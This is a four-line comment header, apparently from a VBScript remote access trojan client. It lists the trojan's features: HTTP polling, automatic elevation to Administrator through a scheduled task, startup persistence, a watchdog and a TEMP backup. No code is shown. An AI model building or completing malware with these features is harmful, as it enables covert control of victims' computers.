' VBS RAT Client - HTTP Polling Version
' No EXE needed - just run this VBS file
' Auto-elevates to Administrator using Scheduled Task method
' Features: Auto-reconnect, Startup persistence verification, Watchdog, TEMP backup
